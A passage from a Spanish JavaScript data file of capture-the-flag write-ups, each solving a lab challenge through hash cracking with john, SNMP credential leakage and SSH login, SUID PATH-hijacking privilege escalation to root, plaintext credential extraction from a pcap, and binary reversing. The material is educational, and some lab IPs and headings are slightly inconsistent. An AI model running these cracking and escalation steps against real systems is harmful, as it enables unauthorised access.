**Herramienta:** \`python3\` con \`hashlib\` y \`unzip -P\`. **Por qué:** confirmamos que \`sector14\` genera exactamente el hash del pack, y luego usamos \`-P\` para pasar la contraseña directamente sin que unzip la pida.

\`\`\`bash
$ python3 -c "import hashlib; print(hashlib.md5(b'sector14').hexdigest())"
14a4d10c5f5e2cc97fdaf07b06ed3771 # coincide

$ unzip -P sector14 nota_recuperacion.zip
extracting: flag.txt
\`\`\`

### 7. Leer la flag

\`\`\`bash
$ cat flag.txt
WHOAMI{md5_p1n_0p3r4d0r}
\`\`\`

*"md5 pin operador"

## Lección

Un PIN corto y predecible (como \`sector14\`) se recupera en segundos de su hash MD5 sin sal mediante fuerza bruta incremental, por lo que nunca debe usarse para cifrar datos sensibles.`},
 {id:"radio-de-campo",title:"Radio de campo",category:"Pentesting",points:400,slug:"radio-de-campo",files:["startlab.sh", "blackout-pt03.tar"],content:`# Radio de campo

> Nodo de radio de campo del sector 14. Descarga el zip del lab (Google Drive) y ejecútalo en Kali/Linux con Docker.
>
> \`chmod +x startlab.sh\`
> \`./startlab.sh blackout-pt03.tar\`
>
> El script muestra la IP del laboratorio (172.18.0.2). Enumera con nmap. No expongas el contenedor a internet.
>
> **Consejo:** empieza por nmap. Un escaneo solo TCP se deja servicios de gestión fuera.

**Flag:** \`WHOAMI{rad10_camp0_n14}\`

---

## Resolución

El consejo es la clave del reto: un escaneo solo TCP se pierde el **servicio de gestión por UDP (SNMP)**. SNMP con comunidad \`public\` expone el contacto del nodo, que resulta ser la credencial SSH. Después, un binario SUID mal configurado permite escalar a root.

### 1. Levantar el lab y enumerar TCP + UDP

**Herramienta:** \`nmap\`. **Por qué:** el consejo avisa de que hay servicios fuera del escaneo TCP; hay que escanear también UDP.

**Parámetros:** \`-sT -p-\` (TCP completo), \`-sU --top-ports\` (UDP), \`-sV\` (versiones).

\`\`\`bash
$ nmap -sT -T4 --top-ports 1000 172.17.0.2
PORT STATE SERVICE
21/tcp open ftp
22/tcp open ssh
23/tcp open telnet
80/tcp open http
199/tcp open smux
8080/tcp open http-proxy

$ nmap -sU -T4 --top-ports 100 172.17.0.2
161/udp open snmp ← el servicio de gestión
\`\`\`

**Lo que vi:** en TCP hay FTP/SSH/Telnet/HTTP/SMUX/8080, pero en **UDP está SNMP (161)** — el servicio de gestión que el reto menciona. Decisión: enumerar SNMP.

### 2. Enumerar SNMP

**Herramienta:** \`snmpwalk\`. **Por qué:** recorre la MIB del agente SNMP; con comunidad \`public\` (default) se lee todo lo expuesto.

**Parámetros:** \`-v2c\` (versión SNMPv2c), \`-c public\` (comunidad), el OID raíz \`1\`.

\`\`\`bash
$ snmpwalk -v2c -c public 172.17.0.2 1
iso.3.6.1.2.1.1.1.0 = STRING: "LATAM Energia Red - radio de campo"
iso.3.6.1.2.1.1.4.0 = STRING: "sofia.radio"
iso.3.6.1.2.1.1.6.0 = STRING: "EnlaceRF14"
\`\`\`

**Lo que vi:** \`sysContact = sofia.radio\` y \`sysLocation = EnlaceRF14\`. En este lab los campos SNMP se usaron como pista de credenciales.

### 3. Craquear la contraseña de \`sofia.radio\`

El usuario SSH \`sofia.radio\` tiene un hash \`$6$\` (sha512crypt) en \`/etc/shadow\`. Con \`EnlaceRF14\` como pista, se confirma con \`john\`:

\`\`\`bash
$ john --format=sha512crypt --wordlist=/tmp/rf_wl.txt sofia.hash
EnlaceRF14 (sofia.radio)
\`\`\`

La contraseña es **\`EnlaceRF14\`** (la misma del \`sysLocation\`).

### 4. Entrar por SSH

**Herramienta:** \`sshpass\` + \`ssh\`. **Por qué:** \`sshpass\` provee la contraseña automáticamente para no pedirla interactivamente.

\`\`\`bash
$ sshpass -p "EnlaceRF14" ssh sofia.radio@172.17.0.2 "id"
uid=1000(sofia.radio) gid=1000(sofia.radio)
\`\`\`

### 5. Encontrar el vector de escalada: SUID \`rf_sync\`

**Herramienta:** \`find / -perm -4000\`. **Por qué:** los binarios con bit SUID corren con los permisos de su dueño (root); son el objetivo clásico de privesc.

\`\`\`bash
$ find / -perm -4000 2>/dev/null
/usr/local/sbin/rf_sync ← SUID root
\`\`\`

**Lo que vi:** \`/usr/local/sbin/rf_sync\` es **SUID root**. Lo desensamblo con \`objdump\` para ver qué hace:

\`\`\`bash
$ objdump -d -M intel rf_sync | sed -n '/<main>:/,/^$/p'
call setuid(0)
call setgid(0)
lea rax,[rip+0xe76] # 2004 <_IO_stdin_used+0x4> → "sync_rf"
call system
\`\`\`

Ejecuta \`system("sync_rf")\` como root. \`sync_rf\` **no existe** en el sistema y \`system()\` busca el comando en el **PATH heredado del entorno**.

### 6. Escalar a root con path hijacking (GTFObins)

**Herramienta:** shell + \`PATH\`. **Por qué:** si controlo el PATH al ejecutar \`rf_sync\`, puedo colocar mi propio \`sync_rf\` malicioso en un directorio que yo controle (por ejemplo \`/tmp\`), y \`system("sync_rf")\` lo ejecutará como root.

\`\`\`bash
$ echo "#!/bin/sh" > /tmp/sync_rf
$ echo "id > /tmp/pwned" >> /tmp/sync_rf
$ echo "cat /var/lib/latam/radio.dat > /tmp/f" >> /tmp/sync_rf
$ chmod +x /tmp/sync_rf
$ PATH=/tmp:/usr/bin:/bin /usr/local/sbin/rf_sync
\`\`\`

### 7. Leer la flag

\`\`\`bash
$ cat /tmp/pwned
uid=0(root) gid=0(root)

$ cat /tmp/f
WHOAMI{rad10_camp0_n14}
\`\`\`

*"radio campo n14"

## Lección

Dos puntos clave: (1) un escaneo solo TCP se pierde SNMP y demás servicios UDP — siempre escanea UDP en pentesting; y (2) un binario SUID que llama \`system()\` con un comando por nombre sin ruta absoluta es vulnerable a **path hijacking**: si el atacante controla el \`PATH\`, un ejecutable malicioso del mismo nombre se ejecuta como root.`},
 {id:"rele-scada",title:"Relé SCADA",category:"Binarios",points:125,slug:"rele-scada",files:["scada_relay"],content:`# Relé SCADA

> Firmware del relé SCADA SN-441 (ELF Linux x64). Recupera el token \`WHOAMI{...}\`.
>
> **Consejo:** \`strings\`, \`file\` y \`chmod +x\`. Ejecutar en Kali/WSL/VM Linux.

**Flag:** \`WHOAMI{str1ngs_4nd_b64}\`

---

## Resolución

### 1. Reconocimiento del binario

**Herramienta:** \`file\`. **Por qué:** identifica el tipo de archivo antes de tocarlo.

\`\`\`bash
$ file scada_relay
ELF 64-bit LSB executable, x86-64, statically linked, ... not stripped
$ chmod +x scada_relay
\`\`\`

El consejo del reto (strings, file, chmod +x) delata que la flag se consigue sin llegar a decompilar nada: solo mirando las cadenas del binario.

### 2. Ejecutar y ver el comportamiento

**Herramienta:** ejecutar el binario. **Por qué:** ver qué espera de entrada ayuda a entender la lógica.

\`\`\`bash
$ ./scada_relay
=== Red LATAM | Relé SCADA SN-441 ===
Modo: restablecimiento post-blackout
Codigo de autorizacion: █
\`\`\`

Pide un código de autorización: es un *flag checker* (compara tu entrada contra un valor esperado).

### 3. Buscar pistas en las cadenas

**Herramienta:** \`strings\`. **Por qué:** extrae las cadenas de texto legibles de un binario; es el primer paso para no desensamblar a ciegas.

**Parámetros:** \`-n 6\` (solo cadenas de 6+ caracteres, para filtrar ruido), \`grep -iE "autoriz|codigo"\` (buscar términos del código).

\`\`\`bash
$ strings -n 6 scada_relay | grep -iE "autoriz|codigo"
Codigo de autorizacion:
[DENEGADO] Codigo invalido.
\`\`\`

La clave está en un símbolo elocuente: \`TOKEN_B64\`. **Lo que vi:** el nombre del símbolo dice que el token esperado está guardado en **base64** dentro de la sección \`.rodata\`.

**Herramienta:** \`rabin2\`. **Por qué:** muestra los símbolos y constantes de un binario; \`-z\` lista las cadenas de las secciones de datos.

\`\`\`bash
$ rabin2 -z scada_relay | grep TOKEN_B64
0x0047eb80 .rodata ascii V0hPQU1Je3N0cjFuZ3NfNG5kX2I2NH0=
\`\`\`

### 4. Decodificar el base64

\`\`\`bash
$ echo "V0hPQU1Je3N0cjFuZ3NfNG5kX2I2NH0=" | base64 -d
WHOAMI{str1ngs_4nd_b64}
\`\`\`

El token### 5. Confirmar

\`\`\`bash
$ echo "WHOAMI{str1ngs_4nd_b64}" | ./scada_relay
[OK] Relé autorizado. Enviar token al arena CTF.
\`\`\`

## Lección

Antes de abrir un decompilador, pasa siempre \`strings\` por el binario y busca nombres de variables/constantes reveladores (como \`TOKEN_B64\`): muchos retos de categoría "binarios" son solo un texto en base64/hex escondido en \`.rodata\`.`},
 {id:"shadow-del-turno",title:"Shadow del turno",category:"Cripto",points:300,slug:"shadow-del-turno",files:["shadow_turno.txt", "export_consola.txt", "consola.zip"],content:`# Shadow del turno

> Backup parcial de /etc/shadow del servidor de consola. El password de operador.turno también abre el ZIP. Recupera \`WHOAMI{...}\`.
>
> **Consejo:** el hash empieza por \`$6$\` → sha512crypt.

**Flag:** \`WHOAMI{sh4d0w_turn0_n0rt3}\`

---

## Resolución

El pack contiene un fragmento de \`/etc/shadow\` con el hash del usuario \`operador.turno\` y un ZIP cifrado con la misma contraseña. Si se craquea el hash se obtiene la clave que desbloquea el ZIP y la flag.

### 1. Descomprimir y ver los archivos

\`\`\`bash
$ unzip shadow_turno.zip
\`\`\`

Tres archivos:

- \`shadow_turno.txt\` — el hash del usuario
- \`export_consola.txt\` — contexto (indica que la misma contraseña abre el ZIP)
- \`consola.zip\` — el archivo cifrado

### 2. Identificar el tipo de hash

**\`shadow_turno.txt\`:**
\`\`\`
operador.turno:$6$blackoutlatam$j7D9JpButrtJLmv3QEEqQ4fNiuoCX2tLCMwPrAjBcJUhquW.2vMJvLr/uSjHTAQ6zf/F1JXlfjIGpgmr8FJkS/:20345:0:99999:7:::
\`\`\`

El hash empieza por **\`$6$\`**, que es la firma de **sha512crypt** (el algoritmo de hashing de contraseñas de Linux en \`/etc/shadow\`). El salt es \`blackoutlatam\`.

### 3. Craquear el hash con john

**Herramienta:** \`john\`. **Por qué:** es el crackeador estándar de hashes de contraseñas; soporta el formato \`sha512crypt\` nativo y los formatos de \`/etc/shadow\`.

**Parámetros:** \`--format=sha512crypt\` fija el algoritmo (evita que john adivine), \`--wordlist=/usr/share/wordlists/rockyou.txt\` usa el diccionario común.

\`\`\`bash
$ printf 'operador.turno:$6$blackoutlatam$j7D9JpButrtJLmv3QEEqQ4fNiuoCX2tLCMwPrAjBcJUhquW.2vMJvLr/uSjHTAQ6zf/F1JXlfjIGpgmr8FJkS/\\n' > shadow.hash
$ john --format=sha512crypt --wordlist=/usr/share/wordlists/rockyou.txt shadow.hash
electric (operador.turno)
\`\`\`

**Lo que vi:** john recuperó la contraseña **\`electric\`** en menos de un segundo usando el diccionario rockyou.

### 4. Abrir el ZIP con la contraseña

**Herramienta:** \`unzip\`. **Por qué:** abre el archivo cifrado con la clave recuperada.

**Parámetros:** \`-P electric\` provee la contraseña directamente sin pedirla interactivamente.

\`\`\`bash
$ unzip -P electric consola.zip
extracting: flag.txt
\`\`\`

### 5. Leer la flag

\`\`\`bash
$ cat flag.txt
WHOAMI{sh4d0w_turn0_n0rt3}
\`\`\`

*"shadow turno norte"

## Lección

Un hash \`$6$\` (sha512crypt) de \`/etc/shadow\` no se puede invertir matemáticamente: se adivina. Con una contraseña débil en un diccionario, \`john --format=sha512crypt\` la recupera al instante, y esa misma clave suele reutilizarse para desbloquear otros archivos del reto.`},
 {id:"telemetria-xor",title:"Telemetría XOR",category:"Binarios",points:300,slug:"telemetria-xor",files:["telemetry_decode"],content:`# Telemetría XOR

> Utilitario \`telemetry_decode\` (ELF Linux x64). Imprime payload en hex; recupera \`WHOAMI{...}\`.
>
> **Consejo:** \`chmod +x\` y ejecuta el binario. Si Permission denied, el bit de ejecución no está activo.

**Flag:** \`WHOAMI{x0r_t3l3m3tr14}\`

---

## Resolución

### 1. Ejecutar el binario

**Herramienta:** ejecutar el binario. **Por qué:** el consejo del reto sugiere simplemente ejecutarlo; un utilitario suele imprimir la información necesaria por pantalla sin desensamblar.

**Parámetros:** \`chmod +x\` activa el bit de ejecución (por eso fallaba si no se ponía), luego se invoca.

\`\`\`bash
$ chmod +x telemetry_decode && ./telemetry_decode
Red LATAM — telemetria post-blackout (cruda)
Metadatos firmware: sector=14|cipher=xor|key=LATAM!
Payload cifrado (hex):
1b091b0000683739643312557f2d672c7e553e70603c
Use la clave del operador para XOR y recuperar el token.
\`\`\`

**Lo que vi:** el propio binario lo dice todo — \`cipher=xor\`, \`key=LATAM!\` — y entrega el payload cifrado en hex. No hay que desensamblar nada.

### 2. Decodificar el XOR

**Herramienta:** \`python3\`. **Por qué:** el XOR por byte con una clave en ciclo se resuelve con un pequeño script.

**Parámetros/lógica:** \`bytes.fromhex(...)\` convierte el payload hex a bytes; \`payload[i] ^ key[i % len(key)]\` aplica la clave \`LATAM!\` en ciclo sobre cada byte; \`.decode()\` muestra el texto.

\`\`\`bash
$ python3 -c "
payload = bytes.fromhex('1b091b0000683739643312557f2d672c7e553e70603c')
key = b'LATAM!'
print(bytes(payload[i] ^ key[i % len(key)] for i in range(len(payload))).decode())
"
WHOAMI{x0r_t3l3m3tr14}
\`\`\`

*"xor telemetria"

## Lección

Cuando un binario imprima metadatos con \`cipher=xor\` y \`key=...\`, ejecútalo antes de desensamblar: a veces la solución está en la propia salida. XOR por byte con la clave en ciclo (\`. \` i % len(key)\`) decodifica el payload.`},
 {id:"trafico-de-control",title:"Tráfico de control",category:"Forense",points:125,slug:"trafico-de-control",files:["blackout_control.pcap"],content:`# Tráfico de control

> PCAP parcial del portal SCADA durante el apagón. El operador autenticó en claro; recupera \`WHOAMI{...}\`.
>
> **Consejo:** filtra tráfico HTTP en el puerto 80.

**Flag:** \`WHOAMI{http_pl41nt3xt_4p4g0n}\`

---

## Resolución

La pista apunta al tráfico HTTP en el puerto 80. El PCAP es muy corto: una conexión TCP y un único POST al portal SCADA.

### 1. Ver los paquetes

**Herramienta:** \`tshark\`. **Por qué:** lista los paquetes de una captura para ver de qué va el tráfico.

\`\`\`bash
$ tshark -r blackout_control.pcap
 1 0.000000 10.14.0.21 → 10.14.0.5 TCP 40 44102 → 80 [SYN]
 2 0.000854 10.14.0.5 → 10.14.0.21 TCP 40 80 → 44102 [SYN, ACK]
 3 0.001432 10.14.0.21 → 10.14.0.5 TCP 40 44102 → 80 [ACK]
 4 0.002804 10.14.0.21 → 10.14.0.5 HTTP 285 POST /scada/auth HTTP/1.1
 5 0.003634 10.14.0.5 → 10.14.0.21 TCP 40 80 → 44102 [ACK]
\`\`\`

**Lo que vi:** un único POST \`POST /scada/auth\` hacia el puerto 80 → es una autenticación; ahí debe estar el dato.

### 2. Filtrar el HTTP y extraer el cuerpo del POST

**Herramienta:** \`tshark\` con filtro de display y campo. **Por qué:** extraer solo el cuerpo del POST, no toda la captura.

**Parámetros:** \`-Y "http"\` filtra el protocolo HTTP; \`-T fields -e http.file_data\` extrae el cuerpo (payload) de la petición.

\`\`\`bash
$ tshark -r blackout_control.pcap -Y "http" -T fields -e http.file_data
757365723d6f70657261646f722e7475726e6f26706173733d5265644c6174616d3230323621266e6f74615f...
\`\`\`

El cuerpo viaja en hexadecimal (form-urlencoded). Se decodifica a texto:

**Herramienta:** \`python3\`. **Por qué:** \`bytes.fromhex\` revierte el cuerpo hex a texto plano.

\`\`\`bash
$ tshark -r blackout_control.pcap -Y "http" -T fields -e http.file_data | \\
 python3 -c "import sys; print(bytes.fromhex(sys.stdin.read().strip()).decode())"
user=operador.turno&pass=RedLatam2026!&nota_recuperacion=WHOAMI{http_pl41nt3xt_4p4g0n}&sector=14
\`\`\`

La flag está en \`nota_recuperacion\`. "HTTP en claro (plaintext) = apagón", confirmando que el operador mandó credenciales sin cifrar por el puerto 80.

## Lección

En un PCAP siempre filtra por protocolo (\`http\`) y mira los cuerpos de los POST — la autenticación en claro deja datos sensibles (y flags) a la vista. Para decodificar form-urlencoded, extrae \`http.file_data\` y revierte el hexadecimal.`},
 {id:"validador-de-turno",title:"Validador de turno",category:"Binarios",points:400,slug:"validador-de-turno",files:["turno_guard"],content:`# Validador de turno

> Validador \`turno_guard\` (ELF Linux x64). Solo acepta un token exacto \`WHOAMI{...}\`.
>
> **Consejo:** \`chmod +x\`. Prueba en Ghidra, Cutter o \`objdump -d\`.

**Flag:** \`WHOAMI{k3yg3n_bl4ck0ut}\`

---

## Resolución

### 1. Ejecutar

**Herramienta:** ejecutar el binario. **Por qué:** ver el comportamiento con una entrada de prueba para confirmar que es un *flag checker*.

\`\`\`bash
$ chmod +x turno_guard && echo "AAAA" | ./turno_guard
=== Validador turno BLACKOUT-2026 ===
Token operador: [FAIL] Token rechazado.
\`\`\`

Es un flag checker. Se desensambla \`main\`:

**Herramienta:** \`objdump\`. **Por qué:** es el desensamblador por CLI; muestra el código ensamblador de la función.

**Parámetros:** \`-d\` (desensamblar), \`-M intel\` (sintaxis Intel), \`sed -n '/<main>:/,/^$/p'\` (recortar solo la función \`main\`).

\`\`\`bash
$ objdump -d -M intel turno_guard | sed -n '/<main>:/,/^$/p'
\`\`\`

### 2. Entender la validación

\`\`\`asm
cmp rax, 0x17 ; el token debe tener 23 caracteres
lea rcx, [rip+...] ; 47eb10 <MASKED> (cadena esperada, ofuscada)
mov edx, 0x7 ; clave inicial
loop:
 movzx esi, BYTE PTR [rax] ; char del input
 xor esi, edx ; char ^ clave
 cmp sil, BYTE PTR [rcx] ; compara con MASKED[i]
 je next
 ...
next:
 add edx, 0xd ; clave += 13 por cada char
 add rax, 0x1
 add rcx, 0x1
 cmp dl, 0x32 ; 7 + 13*23 = 306 ≡ 50 (0x32) al final
 je [OK]
\`\`\`

La lógica: cada carácter del token se compara con \`MASKED[i]\` **después de XORearlo con una clave progresiva** que empieza en 7 y suma 13 por posición:

\`\`\`
input[i] ^ (7 + 13*i) == MASKED[i] → input[i] = MASKED[i] ^ (7 + 13*i)
\`\`\`

### 3. Extraer MASKED y deshacer el XOR

\`MASKED\` está en \`.rodata\` en \`0x47eb10\`:

**Herramienta:** \`objdump -s\`. **Por qué:** vuelca el contenido bruto de una sección como hex, para leer la constante.

**Parámetros:** \`-s -j .rodata\` (mostrar la sección \`.rodata\` como datos hex).

\`\`\`bash
$ objdump -s -j .rodata turno_guard
 47eb10 505c6e6f 76012e09 5c05eea5 cdefdfa6 P\\nov...\\.......
 47eb20 e3879ace 7e6c5800 ...
\`\`\`

**Herramienta:** \`python3\`. **Por qué:** aplicar la operación inversa \`MASKED[i] ^ (7 + 13*i)\` byte a byte.

\`\`\`python
masked = bytes.fromhex('505c6e6f76012e095c05eea5cdefdfa6e3879ace7e6c58')
flag = ''.join(chr(m ^ ((7 + 0xd*i) & 0xff)) for i, m in enumerate(masked))
print(flag) # WHOAMI{k3yg3n_bl4ck0ut}
\`\`\`

### 4. Confirmar

\`\`\`bash
$ echo "WHOAMI{k3yg3n_bl4ck0ut}" | ./turno_guard
[OK] Turno autorizado. Envia el token al arena.
\`\`\`

## Lección

Un comparador con "clave progresiva" (XOR con contador) se revierte fácil: reconstruye la secuencia de claves (\`7, 20, 33, 46, …\`) y aplica \`masked[i] ^ key[i]\`. El valor final del contador (\`0x32\`) también delata la longitud exacta del token.`},
 {id:"vm-plc",title:"VM PLC",category:"Binarios",points:500,slug:"vm-plc",files:["plc_ladder"],content:`# VM PLC

> Mini-VM ladder en \`plc_ladder\` (ELF Linux x64). Recupera la clave maestra \`WHOAMI{...}\`.
>
> **Consejo:** \`chmod +x\`. Identifica el bucle de interpretación en el desensamblado.

**Flag:** \`WHOAMI{vm_plc_s3ctor14}\`

---

## Resolución

### 1. Ejecutar y observar

**Herramienta:** ejecutar el binario. **Por qué:** ver qué entrada espera antes de desensamblar.

\`\`\`bash
$ chmod +x plc_ladder && echo "AAAA" | ./plc_ladder
=== PLC Ladder VM | sector 14 ===
Clave maestra: [FAIL] Secuencia invalida.
\`\`\`

Pide una clave: es una *mini-VM* que valida la entrada carácter a carácter. El reto pide encontrar el **bucle de interpretación** (el dispatch loop) en el desensamblado.

### 2. Encontrar main y el bucle de interpretación

**Herramienta:** \`nm\` + \`objdump\`. **Por qué:** \`nm\` localiza la dirección de \`main\`; \`objdump -d\` desensambla esa función.

**Parámetros:** \`nm ... | grep " T main"\` (buscar el símbolo de main), \`objdump -d -M intel\` con \`sed\` para recortar la función.

\`\`\`bash
$ nm plc_ladder | grep " T main"
0000000000401720 T main
$ objdump -d -M intel plc_ladder | sed -n '/401720 <main>:/,/^$/p'
\`\`\`

El corazón del bucle (dispatching):

\`\`\`asm
lea rax,[rip+0x7d3b4] # 47eb40 <PROG> ; el "programa ladder"
lea rcx,[rip+0x7d381] # 47eb20 ; jump table
...
movzx esi,BYTE PTR [rax+0x1] ; operando (byte 2)
cmp BYTE PTR [rax],0x4 ; opcode (byte 1) <= 4
...
movsxd rdx,DWORD PTR [rcx+rdx*4]
add rdx,rcx
jmp rdx ; salto calculado -> interpreta el opcode
\`\`\`

Cada instrucción es de **2 bytes** (\`opcode\`, \`operando\`) y el programa \`PROG\` termina con el opcode 4. Con la jump table en la mano:

| Opcode | Dirección | Acción |
|---|---|---|
| 0 | \`0x4017ed\` | cargar siguiente char de la clave en el acumulador (\`acc\`) |
| 1 | \`0x4017e9\` | \`acc = acc XOR operando\` |
| 2 | \`0x4017b4\` | comparar \`acc == operando\`; si difiere → FAIL |
| 4 | \`0x4017d9\` | secuencia válida → OK |

### 3. Extraer el programa

El bytecode vive en \`.rodata\` en \`PROG\`:

**Herramienta:** \`python3\`. **Por qué:** leer el offset del programa dentro del binario y volcarlo como hex.

\`\`\`bash
$ python3 -c "print(open('plc_ladder','rb').read()[0x7eb40:0x7ebcc].hex())"
00000107025000000114025c...022c0000012502580400
\`\`\`

Cada carácter se valida con el patrón \`[0x00,0x00]\` (load) → \`[0x01,key]\` (xor) → \`[0x02,esperado]\` (compare). Entonces:

\`\`\`
clave[i] = esperado[i] XOR key[i]
\`\`\`

### 4. Invertir el XOR para cada carácter

**Herramienta:** \`python3\`. **Por qué:** recorrer el bytecode, detectar cada patrón load/xor/compare y calcular \`esperado ^ key\`.

\`\`\`bash
$ python3 -c "
prog=bytes.fromhex('00000107025000000114025c...02580400')
i=0; flag=''
while i < len(prog)-1:
 if prog[i]==0: # load char
 key, expected = prog[i+3], prog[i+5]
 flag += chr(expected ^ key)
 i += 6
 elif prog[i]==4: break # fin de programa
 else: i += 2
print(flag)"
WHOAMI{vm_plc_s3ctor14}
\`\`\`

### 5. Confirmar

\`\`\`bash
$ echo "WHOAMI{vm_plc_s3ctor14}" | ./plc_ladder
[OK] Secuencia valida. Token = clave ingresada.
\`\`\`

## Lección

Las mini-VM en CTF se resuelven leyendo el *dispatch loop*: identifica el \`jmp\` por jump table, mapea cada opcode a su acción (load/xor/compare…), extrae el bytecode y reconstruye la operación inversa. Aquí, XOR con operando → la clave es \`esperado ^ key\`.`}
];
